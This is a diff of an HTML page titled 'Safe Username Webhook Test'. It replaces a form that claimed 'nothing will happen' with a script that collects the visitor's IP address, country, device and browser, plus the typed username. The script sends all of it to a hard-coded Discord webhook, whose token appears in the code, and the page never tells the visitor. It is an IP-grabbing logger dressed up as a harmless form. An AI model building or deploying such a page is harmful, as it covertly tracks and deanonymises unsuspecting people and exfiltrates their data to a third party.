@@ -1,18 +1,111 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Info Form</title>
+    <meta charset="UTF-8">
+    <title>Safe Username Webhook Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #111;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-top: 50px;
+        }
+        input, button {
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 6px;
+            border: none;
+        }
+        button {
+            cursor: pointer;
+            background: #5865F2;
+            color: white;
+        }
+    </style>
 </head>
 <body>
-    <h1>Type your name</h1>
 
-    <input id="username" placeholder="your goofy name">
-    <button onclick="send()">Submit</button>
+    <h2>Enter your username</h2>
+    <input id="usernameInput" type="text" placeholder="Your username">
+    <button onclick="sendWebhook()">Submit</button>
 
-    <p style="max-width: 600px;">
-        By pressing submit, nothing will happen btw
-    </p>
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1445988972835770439/BEAdATfuF_vCWdG6FeXCZQEAaw3BsNv-YsoQGfl3sRQXNw8xDerj7WrFrFkzGYTlf4yo"; // <--- CHANGE THIS
 
-    <script src="log.js"></script>
+        // Collect environment info
+        const pageOpenTime = new Date().toLocaleString();
+        const userAgent = navigator.userAgent;
+
+        function getDeviceType() {
+            if (/mobile/i.test(userAgent)) return "Mobile";
+            if (/tablet/i.test(userAgent)) return "Tablet";
+            return "Desktop";
+        }
+
+        function getBrowser() {
+            if (userAgent.includes("Firefox")) return "Firefox";
+            if (userAgent.includes("Edg")) return "Edge";
+            if (userAgent.includes("Chrome")) return "Chrome";
+            if (userAgent.includes("Safari")) return "Safari";
+            return "Unknown";
+        }
+
+        async function sendWebhook() {
+            const username = document.getElementById("usernameInput").value.trim();
+            if (!username) {
+                alert("Enter a username first.");
+                return;
+            }
+
+            // Fetch IP + Country from ipapi
+            let ip = "Unavailable";
+            let country = "Unavailable";
+
+            try {
+                const response = await fetch("https://ipapi.co/json/");
+                const data = await response.json();
+                ip = data.ip || "Unavailable";
+                country = data.country_name || "Unavailable";
+            } catch (err) {
+                console.log("Could not fetch IP info:", err);
+            }
+
+            const device = getDeviceType();
+            const browser = getBrowser();
+
+            // Prepare Discord embed
+            const payload = {
+                embeds: [
+                    {
+                        title: "New Submission",
+                        color: 5814783,
+                        fields: [
+                            { name: "Username", value: username },
+                            { name: "Time Page Opened", value: pageOpenTime },
+                            { name: "IP Address", value: ip },
+                            { name: "Country", value: country },
+                            { name: "Device Type", value: device },
+                            { name: "Browser", value: browser }
+                        ]
+                    }
+                ]
+            };
+
+            // Send webhook
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                alert("Sent!");
+            }).catch(err => {
+                alert("Failed to send webhook.");
+                console.log(err);
+            });
+        }
+    </script>
 </body>
 </html>
